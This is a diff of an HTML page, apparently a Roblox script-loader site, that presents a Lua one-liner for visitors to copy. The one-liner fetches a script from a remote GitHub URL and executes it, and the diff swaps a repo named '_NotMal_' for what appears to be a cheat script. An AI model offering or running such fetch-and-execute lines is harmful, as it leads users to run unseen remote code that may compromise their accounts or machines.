@@ -1,29 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Script Loader with Animation and Copy Feature</title>
-    <link rel="stylesheet" href="styles.css"> <!-- Link to External CSS for Styling -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Interactive Script Loader</title>
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <!-- Overlay Content -->
-    <div class="overlay">
-        <div class="content">
-            <h1>Interactive Script Loader</h1>
-            <p>This tool allows you to copy a Lua script to execute it via <b>loadstring</b>.</p>
-            
-            <!-- Displaying the loadstring -->
-            <div class="script-container">
-                <textarea id="scriptText" readonly>
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/malindidev/_NotMal_/main/script.lua", true))()
-                </textarea>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy Script</button>
-            </div>
-        </div>
+  <header>
+    <div class="container">
+      <button class="copy-btn" onclick="copyToClipboard()">Copy Script</button>
+    </div>
+  </header>
+
+  <section class="content">
+    <div id="build-animation" class="build-animation">
+      <h2>Scroll Down to see animations</h2>
     </div>
 
-    <!-- External JS for Dynamic Features -->
-    <script src="scripts.js"></script>
+    <div id="script-container" class="hidden">
+      <p>Here is the script:</p>
+      <pre id="script-text">loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/vapevoidware/main/NewMainScript.lua", true))()</pre>
+    </div>
+
+    <div id="running-player" class="running-player">
+      <img src="player_running.gif" alt="Running Roblox Player" />
+    </div>
+  </section>
+
+  <script src="scripts.js"></script>
 </body>
 </html>
